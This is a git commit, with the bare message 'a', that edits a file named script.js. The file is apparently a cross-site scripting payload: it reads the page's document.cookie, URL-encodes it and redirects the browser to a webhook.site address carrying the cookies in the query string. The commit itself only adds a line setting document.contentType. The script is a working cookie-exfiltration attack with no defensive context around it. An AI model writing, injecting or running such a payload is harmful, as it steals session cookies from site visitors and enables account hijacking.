3f45d3d799c9c285349fc1b46580318e712a9af7
diogo02pereira <diogo02pereira@gmail.com>
2023-12-06 09:31:27 +0000

    a

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-
+document.contentType = 'application/javascript';
 var encodedCookies = encodeURIComponent(document.cookie);
 var url = 'https://webhook.site/a61fead7-5d83-44c4-b603-53e282c431e3/?cookies='.concat(encodedCookies);
 window.location.href = url;
